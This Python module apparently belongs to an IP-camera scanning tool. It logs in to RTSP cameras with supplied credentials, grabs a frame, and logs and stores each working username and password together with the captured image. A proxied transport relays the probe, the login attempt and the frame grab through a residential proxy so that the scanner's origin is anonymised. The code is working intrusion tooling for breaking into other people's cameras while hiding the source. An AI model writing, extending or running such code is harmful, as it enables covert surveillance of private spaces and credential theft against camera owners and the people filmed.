"""Confirm an RTSP camera answers by grabbing one frame.

The transport is a strategy: DirectTransport connects straight from the local
IP; ProxiedTransport relays the RTSP TCP connection through the residential exit
(see ProxyTunnel) and forces rtsp_transport=tcp, so the probe, the login attempt
and the frame grab are all anonymised. Each transport yields the URL OpenCV
should open, as a context manager, so probe() stays flat and branch-free.
"""

import logging
import os
import urllib.parse
from contextlib import contextmanager
from dataclasses import dataclass
from typing import Iterator, Protocol

import cv2

from models.camera import Camera
from scanners.proxy import TwoCaptchaProxy
from scanners.proxy_tunnel import ProxyTunnel

# Force RTSP over TCP so control and media share one connection the tunnel can
# carry; stimeout (microseconds) bounds a dead camera behind the proxy.
_TCP_CAPTURE_OPTIONS = "rtsp_transport;tcp|stimeout;8000000"


@dataclass(frozen=True)
class RtspTarget:
    """A single RTSP endpoint to try, with the credentials and URL template."""

    host: str
    port: int
    user: str
    password: str
    url_template: str

    @property
    def url(self) -> str:
        return self.url_template.format(self.user, self.password, self.host, self.port)


def _rewrite_netloc(url: str, host: str, port: int) -> str:
    """Point an RTSP url at (host, port), keeping its userinfo, path and query."""
    parts = urllib.parse.urlsplit(url)
    userinfo = ""
    if parts.username is not None:
        userinfo = parts.username
        if parts.password is not None:
            userinfo += f":{parts.password}"
        userinfo += "@"
    netloc = f"{userinfo}{host}:{port}"
    return urllib.parse.urlunsplit(
        (parts.scheme, netloc, parts.path, parts.query, parts.fragment)
    )


@contextmanager
def _ffmpeg_tcp_transport() -> Iterator[None]:
    """Force OpenCV/FFmpeg to RTSP-over-TCP for the duration, then restore."""
    previous = os.environ.get("OPENCV_FFMPEG_CAPTURE_OPTIONS")
    os.environ["OPENCV_FFMPEG_CAPTURE_OPTIONS"] = _TCP_CAPTURE_OPTIONS
    try:
        yield
    finally:
        if previous is None:
            os.environ.pop("OPENCV_FFMPEG_CAPTURE_OPTIONS", None)
        else:
            os.environ["OPENCV_FFMPEG_CAPTURE_OPTIONS"] = previous


@contextmanager
def _opened_capture(url: str) -> Iterator[cv2.VideoCapture]:
    capture = cv2.VideoCapture(url, cv2.CAP_FFMPEG)
    try:
        yield capture
    finally:
        capture.release()


class Transport(Protocol):
    """Yields the URL OpenCV should open for a target, managing any tunnel."""

    def open(self, target: RtspTarget) -> "Iterator[str]": ...


class DirectTransport:
    """Connect straight to the camera from the local IP (no anonymisation)."""

    @contextmanager
    def open(self, target: RtspTarget) -> Iterator[str]:
        yield target.url


class ProxiedTransport:
    """Relay the RTSP TCP connection through the proxy exit."""

    def __init__(self, proxy: TwoCaptchaProxy):
        self._proxy = proxy

    @contextmanager
    def open(self, target: RtspTarget) -> Iterator[str]:
        with ProxyTunnel(self._proxy.url(), target.host, target.port) as (host, port):
            with _ffmpeg_tcp_transport():
                yield _rewrite_netloc(target.url, host, port)


class RtspProbe:
    """Opens an RTSP stream through a Transport and grabs one frame."""

    def __init__(self, transport: Transport = None, proxy: TwoCaptchaProxy = None):
        self._transport = transport or self._default_transport(proxy)

    def probe(self, target: RtspTarget):
        with self._transport.open(target) as url:
            return self._grab(url, target)

    def _grab(self, url: str, target: RtspTarget):
        logging.debug(url)
        with _opened_capture(url) as capture:
            ok, frame = capture.read()
        if not ok:
            logging.debug("No frame for %s", target.url)
            return None
        logging.info(
            "[!] %s, user: %s, password: %s", target.url, target.user, target.password
        )
        return self._to_camera(target, frame)

    @staticmethod
    def _to_camera(target: RtspTarget, frame) -> Camera:
        image_b64 = cv2.imencode(".jpg", frame)[1].tobytes()
        return Camera(
            ip=target.host,
            port=target.port,
            user=target.user,
            password=target.password,
            url=target.url,
            active=True,
            image_b64=image_b64,
        )

    @staticmethod
    def _default_transport(proxy: TwoCaptchaProxy) -> Transport:
        return ProxiedTransport(proxy) if proxy is not None else DirectTransport()
